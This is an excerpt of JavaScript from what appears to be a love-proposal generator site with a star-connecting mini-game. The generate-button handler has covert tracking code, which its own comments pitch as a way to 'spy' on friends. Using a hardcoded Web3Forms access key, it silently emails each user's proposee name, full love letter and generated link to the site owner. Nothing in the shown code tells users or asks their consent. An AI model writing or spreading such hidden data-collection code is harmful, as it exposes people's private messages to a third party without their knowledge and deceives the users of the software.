...
// 🤫 ADMIN TRACKER: Want to spy on what your friends are doing? 
// Put YOUR Web3Forms access key here. Every time someone builds a 
// proposal on your site, you will secretly get an email with what they wrote!
const ADMIN_TRACKING_KEY = "c72662a1-d197-4a3f-bd4f-a21f9583daac";
...
function prepBuilder() {
  ...
  el('btn-generate').onclick = () => {
    try {
      ...
      // Safest way to get the current URL base, even when run locally without a server
      const baseUrl = window.location.href.split('#')[0].split('?')[0];
      const magicLink = baseUrl + "#" + encoded;

      // --- Secretly email the admin (you) what they just created ---
      if (typeof ADMIN_TRACKING_KEY !== 'undefined' && ADMIN_TRACKING_KEY.trim() !== "") {
        fetch("https://api.web3forms.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json", "Accept": "application/json" },
          body: JSON.stringify({
            access_key: ADMIN_TRACKING_KEY.trim(),
            subject: `🕵️ Site Tracker: Someone just made a proposal!`,
            from_name: "Admin Tracker",
            message: `Someone used your site!\n\nProposing to: ${config.name}\nLove Letter:\n${config.letter}\n\nTheir generated link:\n${magicLink}`
          })
      ...
      // Automatically scroll down so the user sees the generated box!
...
function startGame() {
  ...
  const svg = el('game-svg');

  if (!svg || stars.length === 0) return;

  stars.forEach(star => {
    star.onclick = (e) => {
      if (solved || star.classList.contains('active')) return;
      star.classList.add('active');

      const rect = star.getBoundingClientRect();
      const pRect = el('game-board').getBoundingClientRect();
      const x = rect.left + rect.width / 2 - pRect.left;
      const y = rect.top + rect.height / 2 - pRect.top;

      clickedPoints.push({ x, y });

      // Draw SVG Line from previous dot to this dot
      if (clickedPoints.length > 1) {
        const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');
        const prev = clickedPoints[clickedPoints.length - 2];
      ...
      // Check Win Condition
      if (clickedPoints.length === stars.length) {
        solved = true;

        // Complete the loop with the final line
        ...
        finalLine.setAttribute('x2', clickedPoints[0].x);
        finalLine.setAttribute('y2', clickedPoints[0].y);
        finalLine.setAttribute('stroke', '#ff80ab');
        finalLine.setAttribute('stroke-width', '4');
        finalLine.style.opacity = '0';
        svg.appendChild(finalLine);
        setTimeout(() => {
          finalLine.style.transition = 'opacity 0.6s ease';
        ...
        setTimeout(() => {
          ...
          glow.className = 'game-star-glow show';
          glow.innerHTML = '💖';
          el('game-board').appendChild(glow);
